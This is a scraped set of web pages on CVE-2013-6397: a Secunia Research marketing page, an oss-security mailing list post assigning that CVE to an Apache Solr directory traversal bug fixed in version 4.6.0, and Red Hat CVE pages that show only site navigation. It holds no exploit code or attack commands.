=== Content from secunia.com_01925790_20250125_155135.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from www.openwall.com_606e599d_20250125_155138.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2013/11/26/15) [[next>]](2) [[<thread-prev]](../../../2013/11/26/14) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <5295399B.6040601@redhat.com>
Date: Tue, 26 Nov 2013 17:15:23 -0700
From: Kurt Seifried <kseifried@...hat.com>
To: oss-security@...ts.openwall.com
Subject: Re: CVE request: Apache Solr 4.6.0

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

On 11/26/2013 04:06 PM, Nicolas Grégoire wrote:
> Hello,
>
> Apache Solr 4.6.0 was released a few days ago. This version
> includes a fix for bug SOLR-4882 (directory traversal when
> accessing XSLT stylesheets and Velocity templates):
> <http://lucene.apache.org/solr/4_6_0/changes/Changes.html#v4.6.0.security>
>
>
<https://issues.apache.org/jira/browse/SOLR-4882>
>
> If the user can store his own files on the server, this
> vulnerability could be abused to gain remote code execution.
>
> Regards, Nicolas Grégoire
>
>
>

Please use CVE-2013-6397 for this issue.

- --
Kurt Seifried Red Hat Security Response Team (SRT)
PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.15 (GNU/Linux)

iQIcBAEBAgAGBQJSlTmbAAoJEBYNRVNeJnmT0l8P/2i0kuG+e/OnnKXVLRe4ntY3
0MgHu6RnMfDkWxEnBRojCGvvohHv61Nb+vn1ap/PnbmoG7o0uk0fKc850potUkJA
vI9snU0n2Lt6FLMtQIUuv+kplqpPilem+/Tdfr02G9e19H/04WaeTLEtboSNDLYR
ZTkjxGg4om6KK2hVwYs0OsrFFxe70f/4wxMC2KOwJmnR1HNQAKPZ2jD9HkNSxSWQ
dC7g07TTyE7/r1ns952ushCtuboiuOnAoimHBURhD7OB+VeUXM5FUsp6siw/XBkH
/UJyeBK9wAo4atzNOGBydaJwm/do9v88N5QXiU095LVBtuePt6rMrmthx9OrwD98
+tC2R7fpfeQ1tolpzVGW1KBDTMEHiFUwPGAYXwHVsPAor0fTDHg93C1N4dSgh+yF
MB4tMM8OsWeC+QBAicPL8Dw1DiVPK15TL4kgYHqX2cr4Wf1dd9oVqlYpdRj2VCl+
ouAlI/xYJxmb6tYsFrNwsiqmMFiSsLMy5dmmkafWbMJklWyhcZwkfkUcd9IHZMi1
U0EJzZUuOC3WJjqNm6KLsj7LzVoqy4qBFkoDwpE0EvvCn6R7WJ+GWgZMsnvWpDEo
MlEGI9AejhvT47gtHwFukunurDYx70B9fSk3WuYnBWRnl3gZDbUshY27pa+2tlio
MmtBaT2CQvzaRZb2sRYP
=32bH
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.redhat.com_0e5d7c12_20250126_100335.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.redhat.com_424f631c_20250126_100337.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

